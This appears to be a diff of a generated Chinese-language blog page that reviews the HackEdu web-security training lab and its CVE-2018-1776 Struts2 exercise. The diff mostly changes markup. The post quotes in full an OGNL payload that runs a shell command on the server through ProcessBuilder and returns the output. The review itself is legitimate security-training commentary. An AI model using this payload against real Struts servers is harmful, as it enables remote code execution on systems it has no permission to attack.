@@ -519,14 +519,17 @@
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h2 id="初见"><a href="#初见" class="headerlink" title="初见"></a>初见</h2><p>登陆后的主页经常刷不出来。只会有一个骨架屏在那，内容始终无法获得。看了一下Console，似乎是资源下载失败，大大的<code>404</code>在Console里打印出来。</p>
+        <h2 id="初见"><a class="header-anchor" href="#初见"></a>初见</h2>
+<p>登陆后的主页经常刷不出来。只会有一个骨架屏在那，内容始终无法获得。看了一下Console，似乎是资源下载失败，大大的<code>404</code>在Console里打印出来。</p>
 <p>这个网站主要提供教学式靶场。一个页面分为两部分，左边是教学，类似一些实验指导和漏洞的介绍。右边则是Web页面。这个靶场主要提供Web方向的漏洞。右边的Web页面上除了目标网站，还会有一些必要的小工具，比如Kali的虚拟机，已经构造好的上传文件。在Web页面的上方是拦截请求。Web页面的源码可以很容易的看见。有些时候甚至可以看到后端的代码。HackEdu还很良心的提供两种到三种不同语言的相同后端代码（竟然还有Python2.7）。使用者可以自行为这些后端代码打上补丁，之后再试一下漏洞还是否存在。这算是攻防一起锻炼了。</p>
 <p>一年的订阅价格是750刀，HackerEdu主要的实验为OWASP Top10的漏洞，很少的原生App的实验（这个得订阅才能体验，我也没用过），一些公开的漏洞，还有比较拟真的CTF。</p>
-<h2 id="CVE-2018-1776"><a href="#CVE-2018-1776" class="headerlink" title="CVE-2018-1776"></a>CVE-2018-1776</h2><p>我试了一下这个漏洞的实验。实验的步骤倒是不缺，由于跳过了环境配置的步骤，实验指南主要介绍背景知识，漏洞成因，和利用。</p>
+<h2 id="CVE-2018-1776"><a class="header-anchor" href="#CVE-2018-1776"></a>CVE-2018-1776</h2>
+<p>我试了一下这个漏洞的实验。实验的步骤倒是不缺，由于跳过了环境配置的步骤，实验指南主要介绍背景知识，漏洞成因，和利用。</p>
 <p>由于这是一个关于Struts2 NameSpace和 OGNL的漏洞，指南里便介绍了一下这两个概念。我感觉解释的并不够详细。例子是有，但是对例子没有解释。</p>
 <p>漏洞的成因也是将流程和逻辑上的原因讲解了一下，并没有深入到源码上。对于Apache的补丁也是顺口带了一句。</p>
 <p>漏洞的利用提供了手动和自动两种方式，提供了Payload，但是对Payload没有任何的解释。我看的是一脸懵逼。</p>
-<pre><code class="OGNL">${(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true).(#cmd=&#39;hostname&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;c&#39;,#cmd}:{&#39;bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros )).(#ros.flush())}</code></pre>
+<pre><code class="language-OGNL">${(#_memberAccess['allowStaticMethodAccess']=true).(#cmd='hostname').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','c',#cmd}:{'bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros )).(#ros.flush())}
+</code></pre>
 <p>总体来说，说明不够清楚（虽然在开头有一个到报告的链接），实验部分并没有什么出彩的地方。这个实验并不能看到后端的代码。还是希望深度能有所加深，并不是停留在简单Exploit的层面。</p>
         
                 <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
@@ -1041,11 +1044,11 @@ console.log('\n %c © Material Theme | Version: 1.5.6 | https://github.com/viose
 
                 </main>
             </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
-<script async type="text/x-mathjax-config">
+<script type="text/x-mathjax-config">
   MathJax.Hub.Config("");
 </script>
 
-<script async type="text/x-mathjax-config">
+<script type="text/x-mathjax-config">
   MathJax.Hub.Queue(function() {
     var all = MathJax.Hub.getAllJax(), i;
     for(i=0; i < all.length; i += 1) {
@@ -1054,7 +1057,7 @@ console.log('\n %c © Material Theme | Version: 1.5.6 | https://github.com/viose
   });
 </script>
 
-<script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
 </script>
 <!-- End: Injected MathJax -->
 <!-- hexo-inject:end -->
